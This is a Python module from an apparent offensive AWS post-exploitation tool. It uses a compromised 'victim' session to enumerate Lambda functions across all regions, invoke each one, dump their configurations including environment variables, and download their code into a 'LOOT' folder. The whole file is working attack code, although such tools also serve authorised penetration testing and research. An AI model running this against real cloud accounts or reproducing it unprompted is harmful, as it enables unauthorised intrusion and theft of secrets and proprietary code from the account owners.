from colorama import Fore
import json, requests
from modules.utils import custom_serializer
import modules.globals as my_globals
from botocore.client import Config
from modules.logger import *

BASE_DOWNLOAD_PATH = "LOOT/Lambda_Functions/"

def lambda_init_enum(victim_session, attacker_session):
    enable_print_logging()
    list_lambda_functions(victim_session)

def ensure_dir_for_file(path):
    directory = os.path.dirname(BASE_DOWNLOAD_PATH + path)
    if directory and not os.path.exists(directory):
        os.makedirs(directory, exist_ok=True)

def invoke_lambda_function(lambda_client, function, region):
    try:
        payload = {"key1": "value1"}
        response = lambda_client.invoke(
            FunctionName=f"{function['FunctionName']}",
            InvocationType='RequestResponse',
            LogType='Tail',
            Payload=json.dumps(payload),
            Qualifier=function.get('Version', '$LATEST')
        )
        response_payload = json.loads(response['Payload'].read().decode('utf-8'))
        print(f"{Fore.MAGENTA} | Region: {region} | Function: {function['FunctionName']} | \nResponse:\n{json.dumps(response_payload, indent=4, sort_keys=True, default=custom_serializer)}")
    except KeyboardInterrupt:
        raise
    except Exception as e:
        print(f"{Fore.LIGHTBLACK_EX} | Failed to invoke Lambda function: {function['FunctionName']}")
        log_error(f"Failed to invoke Lambda function: {function['FunctionName']}\n | Error:{e}")

def get_environment_variables(lambda_client, function, region):
    try:
        response = lambda_client.get_function_configuration(FunctionName=f"{function['FunctionName']}")
        print(
            f"{Fore.YELLOW} | Region: {region} | Function: {function['FunctionName']}\n | Configuration:\n"
            f"{json.dumps(response, indent=4, sort_keys=True, default=custom_serializer)}"
        )
    except KeyboardInterrupt:
        raise
    except Exception as e:
        print(f"{Fore.LIGHTBLACK_EX} | Failed to get Lambda function configuration for: {function['FunctionName']}")
        log_error(f"Failed to get Lambda function configuration for: {function['FunctionName']}\n | Error:{e}")

def download_lambda_function(lambda_client, function, region):
    try:
        function_name = function['FunctionName']
        func_details = lambda_client.get_function(FunctionName=function_name)
        ensure_dir_for_file(function_name)
        zip_file = BASE_DOWNLOAD_PATH + function_name + '.zip'
        url = func_details['Code']['Location']

        r = requests.get(url)
        with open(zip_file, "wb") as code:
            code.write(r.content)
        print(f"{Fore.MAGENTA} | Region: {region} | Function: {function_name} | Code downloaded to {zip_file}")
    except KeyboardInterrupt:
        raise
    except Exception as e:
        print(f"{Fore.LIGHTBLACK_EX} | Failed to download Lambda function code for: {function_name}")
        log_error(f"Failed to download Lambda function code for: {function_name}\n | Error:{e}")

def list_lambda_functions(victim_session):
    print(f"{Fore.GREEN}[+] Enumerating Lambda Functions:")
    for region in my_globals.aws_regions:
        try:
            lambda_client = victim_session.client("lambda", region_name=region, config=Config(read_timeout=10, connect_timeout=10))
            functions = lambda_client.list_functions().get("Functions", [])
            for function in functions:
                print(f"{Fore.MAGENTA} | Region: {region} | Function: {function['FunctionName']} | Runtime: {function['Runtime']}")
                # Try to invoke the lambda functions
                invoke_lambda_function(lambda_client, function, region)
                # Try to get configurations set for lambda functions
                get_environment_variables(lambda_client, function, region)
                # Try to download the code for lambda functions
                download_lambda_function(lambda_client, function, region)
        except KeyboardInterrupt:
            raise
        except Exception as e:
            sys.stderr.write("\r\033[K")  # \033[K clears from cursor to end of line
            sys.stderr.write(f"{Fore.LIGHTBLACK_EX} | Failed to list Lambda functions in region {region}")
            sys.stderr.flush()
            log_error(f"\n | Error:{e}")
    print("")